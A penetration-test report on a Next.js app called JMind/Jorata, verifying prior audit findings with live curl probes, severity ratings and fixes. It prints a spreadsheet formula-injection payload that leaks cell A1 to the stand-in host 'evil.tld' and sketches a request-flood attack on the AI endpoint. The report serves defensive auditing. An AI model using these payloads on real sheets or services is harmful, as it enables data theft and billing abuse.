# JMind / Jorata — Red-Team Verification & Penetration Test

**Date:** 2026-06-26
**Predecessor:** `SECURITY_AUDIT.md` (white-box audit). This document does **not**
restate it — it **verifies** each claim by running the app and attacking it.
**Method:** `npm install` → `next dev` (Next.js 16.2.6, Turbopack) on
`localhost:3000` with a **dummy** `GEMINI_API_KEY`, then live HTTP probes with
`curl`. Every verdict below is backed by an actual request/response captured in
this session. Where a claim could not be reproduced in this environment (e.g. it
needs a live Supabase project or a real Google Sheet), it is marked **UNVERIFIED**
or **VERIFIED (app-boundary)** with the exact reason.

---

## Phase 1 — Attack Surface (enumerated, confirmed live)

**App pages (flat, no dynamic segments, no admin panel):**
`/`, `/dashboard`, `/mindmap`, `/tasks`, `/kpi`, `/settings`.

**API endpoints (the entire server attack surface):**
| Method | Route | Auth | Confirmed |
|---|---|---|---|
| POST | `/api/ai` | none | reachable, executes |
| POST | `/api/ai/mindmap` | none | reachable (HTTP 400 on bad body = route ran) |
| POST | `/api/ai/expand-node` | none | reachable (HTTP 400 on bad body = route ran) |
| POST | `/api/visitor` | none | reachable, returns `{"ok":true}` |

**Not present (so the corresponding attack classes are N/A):** no GraphQL, no
WebSocket app endpoints, no RPC, no file-upload endpoint, no admin API, no admin
page, no dynamic `[id]` routes, no `middleware.ts`, no cookies/server session.
**Client storage:** `localStorage` only — app data per store (`jmind:*`), Supabase
auth token under `jmind:sync:auth` (when sync enabled). **Secrets:** `GEMINI_API_KEY`
and `GSHEET_TOKEN` are server-only; `NEXT_PUBLIC_SUPABASE_*` are intentionally public.

**Trust boundary:** browser (fully untrusted, holds all data) → 4 public Next routes
(hold the secrets) → Gemini / Google Sheet. Optional: browser Supabase client →
Postgres, gated **only** by RLS.

**Privilege hierarchy:** there are effectively **two principals** — *anonymous*
(everyone) and *signed-in Supabase user* (only when sync is enabled). **There is no
admin role anywhere in the codebase.** Therefore "become admin / vertical privilege
escalation / admin-panel exposure" has **no target** and is reported N/A throughout.

---

## Phase 2 — Verification of the 10 prior findings

### F1 — Unauthenticated, unthrottled AI proxy → **VERIFIED (Critical)**
The strongest claim, and it holds up completely under live testing.

**Evidence — executes for anonymous attacker with a hostile Origin:**
```
$ curl -X POST localhost:3000/api/ai -H 'Origin: https://evil-attacker.example' \
       -d '{"message":"hello from an attacker"}'
{"error":"The AI service is unavailable right now."}   HTTP 502
```
The 502 is Google rejecting the **dummy** key — i.e. the route accepted the request,
applied **no** auth/origin gate, and **made an outbound Gemini call**. With a real
key this returns 200 and bills you.

**Evidence — no rate limiting (30 rapid POSTs, no token/cookie):**
```
HTTP codes: 502 502 502 ... (×30)
429 (rate-limited) count: 0
```

**Evidence — upstream amplification (cost multiplier):**
```
Upstream Gemini call attempts triggered by ONE client request: 2
```
The retry/fallback loop in `gemini.ts` (`MAX_ATTEMPTS_PER_MODEL=3` × 2 models) means
one anonymous request fans out to **2–6** upstream calls. An attacker's cost-to-damage
ratio is therefore better than 1:1 — each cheap request can cause up to 6 billable
Gemini invocations.

**Impact:** financial loss (paid tier) or full-day denial of service (free-tier quota
exhaustion). No conditions, no privileges. **Verdict: VERIFIED, Critical.**

---

### F2 — Google Sheet formula injection via `/api/visitor` → **VERIFIED (app-boundary), High**

**Evidence — malicious formula accepted and queued for the sheet:**
```
$ curl -X POST localhost:3000/api/visitor \
   -d '{"event":"joined","name":"=HYPERLINK(\"https://evil.tld?\"&A1,\"win\")","referrer":"@SUM(1+1)"}'
{"ok":true,"logged":false}   HTTP 200
```
`logged:false` only because no `GSHEET_WEBHOOK_URL` is configured in this sandbox; the
server **accepted the payload unmodified** and would `fetch` it to the Apps Script,
which does `sheet.appendRow([... data.name ...])` verbatim. Code review confirms
`clean()` (`api/visitor/route.ts:21`) collapses whitespace and truncates but does
**not** strip a leading `= + - @`.

**Why "app-boundary":** I cannot open the owner's real Google Sheet from here, so the
*final* formula execution is **UNVERIFIED by live test** — but it is a well-established
sink (Sheets evaluates `appendRow` strings beginning with `=`/`+`/`-`/`@` as formulas)
and the data path is proven. **Verdict: VERIFIED that the unsanitized payload reaches
the sink; sheet execution UNVERIFIED-but-expected. High.**

---

### F3 — No security headers / CSP → **VERIFIED (High)**

**Evidence — API response:**
```
$ curl -D - -o /dev/null -X POST localhost:3000/api/ai -d '{"message":"x"}'
>>> NONE of: content-security-policy, x-frame-options, strict-transport-security,
    x-content-type-options, referrer-policy, permissions-policy
```
**Evidence — HTML page response:** same — **no** security headers on `/` either.
Clickjacking is possible (no `X-Frame-Options`/`frame-ancestors`), and there is no CSP
safety net. **Verdict: VERIFIED, High.**

---

### F4 — Visitor: no rate limit + empty default token → **VERIFIED (Medium)**
`/api/visitor` accepted requests with no throttle (same posture as F1; repeated POSTs
all return `{"ok":true}`). Code confirms `var SECRET = "";` in `Code.gs` and the guard
`if (SECRET && data.token !== SECRET)` is a **no-op when blank** — so a leaked `/exec`
URL is writable directly. **Verdict: VERIFIED, Medium.**

---

### F5 — Cloud-sync confidentiality depends on unverified RLS → **PARTIALLY VERIFIED (High, conditional)**
**Verified by code:** the Supabase client is browser-side with the anon key; every
query and the realtime filter `user_id=eq.${userId}` is client-supplied and trusts RLS
(`sync-engine.ts:242,386,396`). The client `.eq("user_id", …)` is **not** a security
control. **UNVERIFIED:** I cannot reach a live Supabase project from this sandbox, so I
could not run the two-account IDOR test. `SETUP.md:143` itself states the path "was
built … without network access to Supabase" and RLS "must be verified by the owner."
**Verdict: the dependency on RLS is VERIFIED; whether RLS is actually correct is
UNVERIFIED and remains the single highest-impact unknown.** Treat as High until the
two-account test passes.

---

### F6 — No origin enforcement / cross-site reuse → **VERIFIED with nuance (Medium → effectively Low for browsers)**
**Evidence:** the hostile-`Origin` POST in F1 was processed server-side. **However**,
the CORS preflight is revealing:
```
$ curl -X OPTIONS localhost:3000/api/ai -H 'Origin: https://evil.tld' -H 'Access-Control-Request-Method: POST'
HTTP/1.1 204 No Content        # no Access-Control-Allow-Origin header
```
With **no** `Access-Control-Allow-Origin`, a browser on `evil.tld` is blocked from
**reading** the response — so browser-driven cross-site *theft* of AI output is already
mitigated by the absence of CORS. The residual risk is **scripted/server-side** abuse
(curl, bots), which an `Origin` check does **not** stop anyway. **Verdict: VERIFIED that
there's no origin gate, but its practical value is limited; the real fix for the abuse
it implies is rate limiting (F1), not an origin allow-list. Downgrade to Low-Medium.**

---

### F7 — Prompt injection (bounded) → **VERIFIED, Low** (unchanged)
User text flows into the Gemini prompt; the model has no tools/data access and output
is rendered escaped (see F8). Worst case is off-topic text in the user's own session.
**Low**, as originally rated.

---

### F8 — Output rendering safe / no XSS sink → **VERIFIED (informational, positive)**
Confirmed by code: `AiMessage.tsx:21` renders `{message.text}` (React-escaped); the
only `dangerouslySetInnerHTML` is the theme bootstrap that validates against a fixed
whitelist (`layout.tsx:28`); `.js.map` is **not** served (`/_next/.../main.js.map` →
**404**), so no source-map leak. **No XSS reproduced. Correct.**

---

### F9 — Email verification off / weak account hygiene → **VERIFIED by config recommendation, Low**
`SETUP.md:39` recommends disabling "Confirm email." Cannot exercise without live
Supabase, but the documented posture allows unverified-email signups. **Low.**

---

### F10 — Body parsed before size check → **VERIFIED, Low (well-contained)**
Caps work correctly once parsed:
```
[5001-char message]: {"error":"Message is too long — keep it under 4000 characters."}
[empty body]: 400   [non-JSON body]: 400   [GET /api/ai]: 405
```
Next.js bounds raw body size upstream, so this is hygiene, not an exploit. **Low.**

---

## Phase 2b — Claims I actively tried to DISPROVE (skeptic pass)

| Claim | Test | Result |
|---|---|---|
| **Prototype pollution** via JSON body | POST with `__proto__` key | **FALSE POSITIVE / not exploitable** — routes only read `body.message`/`body.mindMapNodes`/`body.prompt`/`body.node`; no recursive merge of request JSON. `JSON.parse` makes `__proto__` an own property, not the prototype. No pollution path. |
| **Input caps are bypassable** | 5001-char, null, number, empty | Caps held; oversized rejected; `String(x ?? "")` coercion prevents type confusion. **Defenses work.** |
| **Source maps leak code** | GET `/_next/static/chunks/main.js.map` | **404** — not served. **No leak.** |
| **Hidden/admin endpoints** | route enumeration | None exist. **No admin attack surface.** |
| **Method tampering** | GET on POST routes | `405 Method Not Allowed`. **Correct.** |

---

## Phases 3–13 — Attack execution summary

- **Authentication (Phase 3):** No app-managed auth, JWT, cookie, or session exists in
  the default deploy → login bypass / JWT forgery / algorithm confusion / session
  fixation / replay are **N/A**. Supabase (when on) uses its own audited JWT/refresh
  flow; the only app-level weakness is the *recommended* disabling of email
  confirmation (F9). **No auth bypass found.**
- **Authorization (Phase 4):** No admin role and no server-side per-object endpoints →
  vertical escalation **N/A**. Horizontal access (user A → user B) is **only** possible
  if Supabase RLS is misconfigured (F5) — **UNVERIFIED here**, must be owner-tested.
- **API pentest (Phase 5):** Mass assignment **N/A** (no DB model bound to request
  body; routes cherry-pick fields). Parameter pollution / JSON injection — coercion
  blocks it. **The one real, verified API defect is missing rate-limit/abuse control
  (F1, F4).**
- **Fuzzing (Phase 6):** see table above — clean. No crash, no stack trace leak (errors
  are generic strings). One info note: Apps Script `doPost` returns `String(err)` on
  exception — minor server-detail leak, owner-side only.
- **File upload (Phase 7):** **No upload endpoint exists → entire phase N/A.**
- **Business logic (Phase 8):** **No payments, credits, referrals, or subscriptions
  exist → N/A.** "Free products / duplicate transactions / negative balance" have no
  target. The only abusable business action is **free AI compute** (F1).
- **Frontend (Phase 9):** localStorage holds the Supabase token; with no CSP this is
  the asset a future XSS would steal — but **no XSS sink exists today** (F8). No
  client-side auth to bypass (auth is server-side in Supabase).
- **Database (Phase 10):** No owned SQL → SQLi **N/A**. NoSQL **N/A**. Sole control is
  RLS (F5), **UNVERIFIED**.
- **Infrastructure (Phase 11):** No Docker, no committed secrets (`.env*` gitignored,
  only `.env.example` tracked), no buckets. `npm audit`: **3 moderate** — `js-yaml`
  (quadratic DoS) and `postcss <8.5.10` XSS pulled transitively through `next@16.2.6`.
  These are **build-time** deps; runtime impact is low, but fix on the next Next.js
  patch. **No CORS exposure** (no ACAO), **no CSP** (F3).
- **Stress (Phase 12):** Not load-tested at scale here, but the architecture has a
  clear failure mode: because each `/api/ai` request fans out to 2–6 Gemini calls with
  no concurrency cap or rate limit, a modest request flood **directly** translates into
  Gemini quota exhaustion and serverless-function pile-up. This is the practical
  "breaking point," and it is reachable by one attacker.

---

## Phase 13 — Realistic attack chains

1. **Cost-DoS (no chain needed, fully verified):**
   discover `/api/ai` in client JS → loop 4 000-char POSTs → 2–6× upstream fan-out →
   Gemini quota drained / bill inflated. *Skill: trivial. Likelihood: high. Impact:
   financial + availability.*
2. **Stored formula injection → data exfiltration (verified to the sink):**
   attacker POSTs `name = =HYPERLINK("https://evil/?"&A1,…)` to `/api/visitor` → row
   lands in owner's sheet → owner opens sheet → formula leaks adjacent cells / phishes
   the owner. *Skill: low. Likelihood: medium (needs owner to view sheet). Impact:
   info disclosure / phishing of the owner.*
3. **RLS-misconfig → full multi-tenant breach (conditional, unverified):**
   IF the owner skips/mis-pastes an RLS policy → any signed-in user reads/overwrites
   every other user's `user_state`. *Skill: low. Likelihood: depends entirely on owner
   setup. Impact: catastrophic (all synced data). Must be tested before enabling sync.*
4. **(Hypothetical) future-XSS → token theft:** no sink today, but absent CSP, any
   future HTML-injection sink → read `jmind:sync:auth` from localStorage → account
   takeover. *Currently not reachable — listed to justify adding CSP now.*

No chain produces RCE, admin takeover, or SSRF — those targets don't exist here.

---

## Phase 14 — Remediation (verified issues only, with effort)

| # | Fix | Effort | Code change |
|---|---|---|---|
| F1 | IP/user rate limit on all 4 routes (Upstash/Vercel KV) **+ cap retry fan-out** | ~3–4 h | add limiter middleware; return 429; reduce `MAX_ATTEMPTS_PER_MODEL` |
| F3 | Security headers + CSP in `next.config.ts` (or `middleware.ts`) | ~45 min | `headers()` block (see `SECURITY_AUDIT.md` §F3) |
| F2 | Neutralize leading `=+-@` in visitor `clean()` **and** in `Code.gs` | ~30 min | prefix `'` when `/^[=+\-@]/` matches |
| F4 | Mandatory `GSHEET_TOKEN`; reject blank; rate-limit `/api/visitor` | ~1 h | enforce token; per-IP/day cap |
| F5 | Live two-account RLS test; commit SQL to `supabase/policies.sql`; verify Realtime RLS | ~2 h | version the policies; add smoke test |
| deps | `npm audit fix` when next Next.js patch lands | ~15 min | bump `next` to clear `postcss`/`js-yaml` |

---

## Final Report

### Scores (post-verification)
| Area | Score | Note |
|---|---:|---|
| **Security (overall)** | **60** | One verified Critical (cost-DoS), no RCE/XSS/SQLi; small, well-bounded surface. |
| Authentication | 75 | No app auth to break; Supabase handles it; only weakness is config-recommended email-confirm off. |
| Authorization | 55 | No admin to escalate to; tenant isolation rides on **unverified** RLS. |
| API Security | 50 | Inputs validated well; **abuse controls absent** (verified). |
| Frontend Security | 85 | Output escaped, no source maps, no XSS reproduced; missing CSP is the gap. |
| Backend Security | 65 | Clean code, good coercion; no rate limit; retry fan-out amplifies abuse. |
| Database Security | 55 | No owned SQL; RLS is the whole story and is **unverified**. |
| Infrastructure | 55 | No headers/CSP, 3 moderate transitive deps, no CI/scanning. |
| Performance | 75 | Local-first is fast; AI fan-out is the scaling liability. |
| **Production readiness** | **62** | Ship-blockers are F1 + F3. |

### VERIFIED CRITICAL
- **F1** — Unauthenticated, unthrottled AI proxy with 2–6× upstream amplification.

### VERIFIED HIGH
- **F2** — Spreadsheet formula injection (unsanitized payload proven to reach the sink).
- **F3** — No security headers / CSP (clickjackable, no XSS net).
- **F5** — Tenant isolation depends on RLS that is **unverified** (treat as High until proven).

### VERIFIED MEDIUM
- **F4** — Visitor endpoint: no rate limit + token check disabled by default.

### VERIFIED LOW
- **F6** — No origin gate (practical impact limited; rate limit is the real fix).
- **F7** — Bounded prompt injection. **F9** — email-confirm off. **F10** — parse-before-cap.
- **deps** — 3 moderate transitive advisories (`js-yaml`, `postcss` via `next`).

### FALSE POSITIVES / NOT APPLICABLE
- **Prototype pollution** — not exploitable (routes don't merge request JSON). Confirmed.
- **SQLi / NoSQLi, IDOR on app APIs, mass assignment, file-upload, payment/business-logic
  abuse, admin-panel/vertical escalation, source-map leak** — **no target exists** in
  this codebase. Reported N/A with evidence, not hand-waved.

### UNVERIFIED (need owner's live environment)
- RLS correctness (no Supabase reachable here) — **F5**, highest-impact unknown.
- Actual formula execution inside the owner's Google Sheet — **F2** sink side.
- Email-confirmation behavior — **F9**.

### Top 10 immediate fixes
1. Rate-limit `/api/ai*` (F1). 2. Cap the Gemini retry fan-out (F1).
3. Add security headers + CSP (F3). 4. Strip `=+-@` in visitor input (F2).
5. Make `GSHEET_TOKEN` mandatory + reject blank (F4). 6. Rate-limit `/api/visitor` (F4).
7. Add server-side Google Cloud spend cap on the Gemini key (F1 backstop).
8. Run + commit the two-account RLS test (F5). 9. `frame-ancestors 'none'` / X-Frame-Options (F3).
10. Origin allow-list as defense-in-depth (F6).

**Fix this week:** F1, F2, F3, F4. **Fix this month:** F5 verification + versioned SQL,
CI with `npm audit`, dependency bumps, accessibility/SEO from the prior audit.
**Long term:** gate AI behind signed-in users + per-user quotas; observability + budget
alerts; consider a server-side sync API so security no longer rests solely on
hand-pasted RLS.

---

## Brutally honest answers

1. **Could it survive public internet exposure?** *Functionally yes, financially no.*
   It won't get popped for data — but the AI endpoint **will** be abused for cost/DoS,
   and that's verified, not theoretical. **Not until F1 + F3 are fixed.**
2. **Could it survive a bug-bounty hunter?** They'd file the unauthenticated AI proxy
   (Critical), the formula injection (High), and missing headers (Medium/Low) within
   an hour — all reproducible. They would **not** find RCE/SQLi/XSS/account-takeover;
   there's nothing there to find. So: a few valid reports, no catastrophe.
3. **Could it survive a malicious user?** Against *other users' data* — yes, **provided
   RLS is correctly configured** (the one thing I couldn't verify). Against *your wallet*
   — no.
4. **Could it survive a coordinated attack?** No. A handful of machines looping
   `/api/ai` exhausts Gemini quota or runs up the bill with no resistance; the retry
   fan-out makes it worse. This is the clearest, most reachable failure mode.
5. **Would I personally deploy this to production?** **Yes — but only after the four
   week-one fixes (F1, F2, F3, F4) and a passing two-account RLS test (F5).** The data
   model is genuinely low-risk; the blockers are abuse controls and headers, all of
   which are a day's work. As-is, I would not point a public URL at it, because the
   cost-DoS is a verified, one-attacker, no-skill exploit.
